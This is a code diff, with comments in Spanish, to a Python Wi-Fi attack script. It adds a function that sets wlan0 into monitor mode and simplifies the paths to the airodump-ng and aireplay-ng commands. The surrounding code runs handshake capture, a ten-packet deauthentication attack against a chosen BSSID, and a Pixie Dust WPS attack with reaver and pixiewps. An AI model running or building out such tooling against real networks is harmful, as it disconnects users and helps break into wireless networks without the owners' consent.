@@ -28,6 +28,13 @@ def check_tool_availability(tool):
         return False
     return True
 
+def set_monitor_mode(interface):
+    """Configura la interfaz de red en modo monitor"""
+    print(f"Configurando la interfaz {interface} en modo monitor...")
+    run_command(f"ip link set {interface} down", use_sudo=True)
+    run_command(f"iw dev {interface} set type monitor", use_sudo=True)
+    run_command(f"ip link set {interface} up", use_sudo=True)
+
 def scan_wifi():
     """Escanear redes Wi-Fi cercanas"""
     print("Escaneando redes Wi-Fi...")
@@ -55,12 +62,12 @@ def scan_wifi():
 def capturar_paquetes(bssid, channel):
     """Capturar paquetes de una red específica"""
     print(f"Capturando paquetes de la red con BSSID {bssid} en el canal {channel}...")
-    run_command(f"/data/data/com.termux/files/usr/bin/airodump-ng --bssid {bssid} -c {channel} -w handshake wlan0", use_sudo=True)
+    run_command(f"airodump-ng --bssid {bssid} -c {channel} -w handshake wlan0", use_sudo=True)
 
 def deauth_attack(bssid):
     """Realizar un ataque de desautenticación"""
     print(f"Realizando ataque de desautenticación contra {bssid}...")
-    run_command(f"/data/data/com.termux/files/usr/bin/aireplay-ng --deauth 10 -a {bssid} wlan0", use_sudo=True)
+    run_command(f"aireplay-ng --deauth 10 -a {bssid} wlan0", use_sudo=True)
 
 def perform_pixie_dust_attack(bssid):
     """Realiza el ataque Pixie Dust usando reaver y pixiewps."""
@@ -102,6 +109,9 @@ def main():
     for tool in tools:
         if not check_tool_availability(tool):
             return
+
+    # Configurar la interfaz en modo monitor
+    set_monitor_mode("wlan0")
 
     # Escanear redes Wi-Fi
     redes, bssids, canales = scan_wifi()
